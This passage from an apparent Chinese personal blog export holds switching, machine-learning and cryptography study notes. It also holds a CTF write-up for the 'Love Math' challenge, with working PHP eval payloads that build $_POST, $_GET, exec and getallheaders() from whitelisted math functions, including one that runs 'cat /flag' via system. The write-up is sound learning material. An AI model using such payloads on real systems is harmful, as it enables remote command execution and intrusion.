COM口连接到交换机的Console口</li></ul></li><li><p>配置端口</p><ul><li><p>双工模式</p><ul><li>全双工Full</li><li>半双工Half</li><li>自协商Auto（默认）</li></ul></li><li><p>速率</p><ul><li>10/100 Mbps</li><li>自协商 默认</li></ul></li><li>MDIX自动功能</li></ul></li></ul><h2 id="3-3-安全"><a href="#3-3-安全" class="headerlink" title="3.3 安全"></a>3.3 安全</h2><h3 id="1-安全实践"><a href="#1-安全实践" class="headerlink" title="1.安全实践"></a>1.安全实践</h3><ul><li><p>十项安全实践</p><ul><li>开发组织的<strong>书面安全策略</strong></li><li><strong>关闭不使用</strong>的服务和端口</li><li>使用<strong>强密码</strong>并经常进行更改</li><li>控制对设备的物理访问</li><li>使用<strong>HTTPs</strong>替换HTTP</li><li>执行<strong>备份</strong>并定期测试备份的文件</li><li>向员工就社会工程攻击进行<strong>培训</strong></li><li><strong>加密</strong>并使用<strong>密码保护</strong>敏感数据</li><li>实施<strong>防火墙</strong></li><li>保持软件为<strong>最新</strong>版本</li></ul></li></ul><h3 id="2-LAN中的安全问题"><a href="#2-LAN中的安全问题" class="headerlink" title="2.LAN中的安全问题"></a>2.LAN中的安全问题</h3><ul><li>MAC地址泛洪<ul><li>进入交换机的数据帧如果无法在其CAM表中找到目的MAC，交换机将通过除源端口之外的所有端口转发流量</li><li>攻击者的PC运行MAC泛洪工具，最终伪造MAC地址会充满CAM表，从而使查表工作无效，交换机就像集线器一样以广播方式工作</li></ul></li><li>利用Telnet<ul><li>Telnet协议是不安全的，应该用SSH代替</li><li>暴力密码破解攻击</li><li>Telnet DoS攻击</li></ul></li></ul><h3 id="3-交换机端口安全"><a href="#3-交换机端口安全" class="headerlink" title="3.交换机端口安全"></a>3.交换机端口安全</h3><ul><li>端口安全限制端口上所允许的有效MAC地址</li><li>允许访问合法设备的MAC地址，而拒绝访问其他MAC地址</li><li>任何通过未知MAC地址进行连接的其他尝试都会导致安全违规</li><li><p>可以通过多种方式配置安全MAC地址：</p><ul><li>静态安全MAC地址 static</li><li>动态安全MAC地址 Dynamic</li><li>粘滞安全MAC地址 Sticky</li></ul></li><li><p>默认不启动端口安全功能 </p></li><li><p>手动启动后的默认配置</p><ul><li>最大安全MAC地址： 1</li><li>违规模式： shutdown</li><li>粘滞地址： 不启用</li></ul></li><li><p>保护未使用的端口</p></li></ul><h3 id="4-SSH"><a href="#4-SSH" class="headerlink" title="4.SSH"></a>4.SSH</h3><ul><li>配置SSH<ul><li>主机名称    </li><li>域名</li><li>本地认证 或者 AAA<ul><li>需要用户名和密码</li></ul></li></ul></li></ul><p>使用crypto key generate rsa 全局配置模式生成RSA密钥对，自动启用ssh</p><p>使用crypto key zeroize rsa 全局配置模式命令删除RSA密钥对，SSH服务器将自动禁用</p><p><code>ssh -l username ip-address</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 校内课程笔记 </tag>
            
            <tag> 路由与交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 初赛] Love Math-总结数学中的命令执行</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>开局给了源码 拿到本地分析一下<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>白名单只给了一堆数学函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>从里面找出来能够利用的拼凑出命令执行</p><p>最终肯定希望能够达成这样的结果<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>所以难点在于如何利用已知函数来拼凑出$_POST</p><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><ol><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>base_convert — 在任意进制之间转换数字，最高为36进制</li><li>dechex — 十进制转换为十六进制</li></ol><p>利用base_convert凑出来hex2bin,再利用hex2bin凑出来_POST,最后用可变变量完成命令执行</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// 转成_POST字符串的十六进制</span></span><br><span class="line"></span><br><span class="line">以上两个语句合起来为 <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// 中括号被ban,用大括号来绕过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h2><h3 id="get传入参数命令执行"><a href="#get传入参数命令执行" class="headerlink" title="get传入参数命令执行"></a>get传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// 通过get方法传入参数完成命令执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headers传入参数命令执行"><a href="#headers传入参数命令执行" class="headerlink" title="headers传入参数命令执行"></a>headers传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">即 exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几点说明</p><p>getallheaders — 获取全部 HTTP 请求头信息</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>当取数组元素时，用大括号会抛出警告而不是错误</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>用上述payload 加上 postman改下headers即可命令执行getflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="字符串异或命令执行"><a href="#字符串异或命令执行" class="headerlink" title="字符串异或命令执行"></a>字符串异或命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>发现俩能用的</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google news：聚类算法，无监督学习算法</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>聚类算法是unsupervised learning的一种</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-模型描述"><a href="#2-1-模型描述" class="headerlink" title="2-1.模型描述"></a>2-1.模型描述</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>根据拟合状况预估房价，是一个supervised learning problem，因为每一个大小都有一个“正确的答案”，并且还是回归问题。</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = “input” variable / features</li><li><p>y = “output” variable / “target” variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means “index”)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2代价函数-一"><a href="#2-2代价函数-一" class="headerlink" title="2.2代价函数(一)"></a>2.2代价函数(一)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3代价函数-二"><a href="#2-3代价函数-二" class="headerlink" title="2.3代价函数(二)"></a>2.3代价函数(二)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>简化代价函数使得$\theta_0 = 0$，理解代价函数</p><p>对于上图特殊的training set，可以找出$\theta_1 = 1$时，可以完美拟合</p><h2 id="2-4代价函数-三"><a href="#2-4代价函数-三" class="headerlink" title="2.4代价函数(三)"></a>2.4代价函数(三)</h2><p>当我们使用$\theta_0$和$\theta_1$时，得到cost function图像类似下图</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>使用等高线的方式来模拟，想象从碗的上方向底部看，minimize J($\theta_0$,$\theta_1$) 就是椭圆的中心，如下图的数据拟合较为不错，cost value可以接受</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-梯度下降"><a href="#2-5-梯度下降" class="headerlink" title="2.5 梯度下降"></a>2.5 梯度下降</h2><p>Repeat until convergence{</p><p>​    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$为学习率，大的时候下山步子大</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="梯度下降1.png" style="zoom:50%;" /></p><h2 id="2-6-梯度下降理解"><a href="#2-6-梯度下降理解" class="headerlink" title="2.6 梯度下降理解"></a>2.6 梯度下降理解</h2><ul><li>梯度下降导数项的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="梯度下降2.png" style="zoom:50%;" /></p><ul><li>梯度下降学习率大小的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="梯度下降3-alpha含义.png" style="zoom:50%;" /></p><ul><li>梯度下降到局部最优点的结果</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="梯度下降4-局部最优点的结果.png" style="zoom:50%;" /></p><h2 id="2-7-线性回归的梯度下降"><a href="#2-7-线性回归的梯度下降" class="headerlink" title="2.7 线性回归的梯度下降"></a>2.7 线性回归的梯度下降</h2><p>梯度下降中导数那一项：</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = \frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$和$\theta_1$情况下的偏导数：</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>该方法是Batch梯度下降法：需要遍历整个训练集</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计划</title>
      <link href="2021/03/05/plan1/"/>
      <url>2021/03/05/plan1/</url>
      
        <content type="html"><![CDATA[<h2 id="计划2021-3-2021-5"><a href="#计划2021-3-2021-5" class="headerlink" title="计划2021.3 - 2021.5"></a>计划2021.3 - 2021.5</h2><blockquote><p>1.web学习<br>2.buu pwn题<br>3.机器学习入门<br>4.操作系统(李治军老师)<br>5.运维(hvv)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学笔记</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="一-密码学概述和古典密码"><a href="#一-密码学概述和古典密码" class="headerlink" title="一.密码学概述和古典密码"></a>一.密码学概述和古典密码</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>密码编码学</strong>和密码分析学</p><blockquote><p>Plaintext:明文，被隐蔽消息，M</p><p>Ciphertext:密文，C</p><p>Encryption:加密</p><p>Decryption:解密，加密的逆过程</p><p>Encryption algorithm: 加密算法，E()</p><p>Decryption algorithm: 解密算法，D()</p><p>Key: 密钥，控制加密和解密算法操作的数据处理，分别称作加密密钥和解密密钥，k</p></blockquote><ul><li>传统密码体制所用的加密密钥和解密密钥相同或<strong>实质上等同</strong>，从一个易于推出另一个：单钥或对称密码体制，无法实现不可否认性</li><li>加密密钥和解密密钥不相同，从一个难于推出另一个，双钥，或非对称密码体制</li></ul><p>密码体系是一个五元组(M C K E D)</p><p>密钥空间K，在单钥体制下K1 = K2 = K</p><p>加密变换$E_{k1}$</p><p>解密变换$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)为保密通信系统</strong></p><p>密码分析者，选定变换函数h，对c进行变换，得到的明文是明文空间中的某个元素，</p><p>即$m’ = h(x)$</p><p>如果m’ = m，则分析成功</p><h3 id="保密系统基本要求"><a href="#保密系统基本要求" class="headerlink" title="保密系统基本要求"></a>保密系统基本要求</h3><ol><li>理论上不可破，即 $ p_r{m’=m}=0 $，当知道已知的明文密文时，要决定密钥或任意明文在计算上是不可行的</li><li>Kerchhoff原则，保密性不依赖于加密体制或算法的保密，而依赖于密钥</li><li>加密解密算法适用于所有密钥空间中的元素</li><li>系统便于实现和使用</li></ol><h3 id="密码系统的攻击"><a href="#密码系统的攻击" class="headerlink" title="密码系统的攻击"></a>密码系统的攻击</h3><ul><li>惟密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><div class="table-container"><table><thead><tr><th>攻击类型</th><th style="text-align:left">攻击者掌握的内容</th><th></th></tr></thead><tbody><tr><td>惟密文攻击</td><td style="text-align:left">加密算法，截获的部分密文</td><td></td></tr><tr><td>已知明文攻击</td><td style="text-align:left">以上及一个或多个明文密文对</td><td></td></tr><tr><td>选择明文攻击</td><td style="text-align:left">自己选择的明文消息及由密钥产生的密文</td><td></td></tr><tr><td>选择密文攻击</td><td style="text-align:left">自己选择的密文消息及相应的被解密的明文</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>无条件安全：无论敌手截获多少密文，花费多长时间都不能解密密文 （一次一密</p><p>计算上安全：1，破译密文的代价超过被加密信息的价值。2，破译密文所花的时间超过信息的有用期。</p><h2 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h2><p>Cryptology - 密码学</p><blockquote><p>三个阶段：</p><p>1.1949之前：古典密码 艺术</p><p>2.1949-1975：近代密码 艺术-&gt;科学</p><p>3.1976年至今：现代密码</p></blockquote><p>古典密码：</p><ol><li>斯巴达棍。算法是缠绕，密钥是棍子的粗细。</li><li>单表代换密码：凯撒密码，单字母代换。算法是代换，密钥是密码表。</li><li>多表代换密码：Enigma密码机。</li></ol><p>近代密码：</p><ol><li>1977年，NBS颁布采纳IBM设计的方案作为非机密数据的数据加密标准DES，Data Encryption Standard。</li><li>2001.11.16，采用AES算法</li><li>1976，W.Diffie，M.E.Hellman，提出非对称密码算法思想</li><li>1977，Rivest，Shamir，Adleman提出RSA密码体制</li></ol><p>公钥密码学实现加密密钥和解密密钥的分离，伟大革命，使用两个密钥：公钥，私钥</p><h2 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>当a和26互为素数的时候才可以解密 最大公因子为1时才互为素数 （不互素的话逆元求不出来，就没法解密</p><p>ab为密钥</p><p>$a^{-1}$为a的逆元</p><h3 id="单表代换优缺点"><a href="#单表代换优缺点" class="headerlink" title="单表代换优缺点"></a>单表代换优缺点</h3><p>频次问题</p><p>相对位置问题</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>加密算法</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.理解保密通信系统模型</p><p>2.密码体制从原理分为两大类，单钥和双钥体制</p><p>3.加密算法两条安全准则</p><p>4.能够计算仿射变换</p><p>5.置换密码的操作</p><h1 id="二-密码学相关数学知识"><a href="#二-密码学相关数学知识" class="headerlink" title="二.密码学相关数学知识"></a>二.密码学相关数学知识</h1><h2 id="1-素数和互素"><a href="#1-素数和互素" class="headerlink" title="1.素数和互素"></a>1.素数和互素</h2><ul><li><p>因子</p><ul><li>b能整除a，b|a : b是a的因子</li><li>b|1    b = $\pm$1</li><li>b|a a|b 则 a=$\pm$b</li><li>b|a  b|c. 则对于任意整数m和n  -&gt; b|(am+cn)</li></ul></li><li><p>素数</p><ul><li>素数是现代数论的核心内容</li><li>p的因子只有 $\pm$1和 $\pm$p</li><li>整数分解的唯一性定理 任一正整数可以唯一分解成素数的乘积<ul><li>$a = p_1^{e_1} + p_2^{e_2} + … + p_t^{e_t}$</li><li>$e_i$是正整数 $p_i$是素数</li></ul></li></ul></li><li><p>互素数 </p><ul><li>c是a和b的最大公因子 c=gcd(a,b)</li><li>因为所有不为0的整数都是0的因子，因此，gcd(a,0) = |a|</li><li><p>如果gcd(a,b) = 1，则称a，b是互素的</p></li><li><p>最小公倍数 lcm。d是a和b的最小公倍数，d=lcm(a,b)</p></li><li>若gcd(a,b) = 1，则lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-模运算"><a href="#2-模运算" class="headerlink" title="2.模运算"></a>2.模运算</h2><ul><li><p>数论</p><ul><li><p>是密码学特别是公钥密码学的基本工具</p></li><li><p>离散的数字集合</p></li><li><p>运算是模加，模减，逆运算</p></li><li><p>对整数和多项式进行模运算</p></li><li><p>字母的通用表示：</p><ul><li>n: 非负整数</li><li><p>p: 素数</p></li><li><p>Z: 整数集合</p></li><li>R: 实数集合</li><li><p>Q: 有理数集合</p></li><li><p>$Z_n$ = {0,1,2…n-1}小于n的非负整数集合</p></li></ul></li></ul></li><li><p>模运算</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>同余</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) 等价a $\equiv$ b mod n</li></ul></li><li><p>同余性质</p><ul><li>a $\equiv$ b mod n，则b $\equiv$ a mod n</li><li>a $\equiv$ b mod n，b $\equiv$ c mod n，则a $\equiv$ c mod n</li><li>a $\equiv$ b mod n，d｜n，则a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ， d = lcm($n_1,n_2,…n_k$)，则a $\equiv$ b mod d，(i = 